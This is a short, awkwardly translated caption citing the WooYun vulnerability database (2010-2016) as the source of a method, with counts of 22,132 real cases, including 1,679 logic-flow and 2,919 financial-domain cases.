*Methodcomment come source:WooYun vulnerabilityDatabase(2010-2016), 22,132 real realCase | Logic Flow Domain 1,679 Case | Financial Domain 2,919 Case*
